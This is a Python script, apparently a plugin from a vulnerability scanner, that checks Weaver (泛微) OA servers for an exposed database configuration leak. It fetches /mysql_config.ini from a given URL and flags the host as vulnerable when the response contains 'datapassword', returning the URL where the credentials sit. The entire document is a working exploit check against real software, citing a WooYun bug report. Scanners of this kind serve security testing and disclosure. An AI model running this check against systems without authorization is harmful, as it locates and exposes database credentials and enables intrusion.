#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA 数据库配置泄露
referer: http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-087500
author: Lucifer
description: mysql_config.ini泄露。
'''
import sys
import requests
import warnings
def run(url):
        result = ['泛微OA 数据库配置泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/mysql_config.ini"
        vulnurl = url + payload

        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"datapassword" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    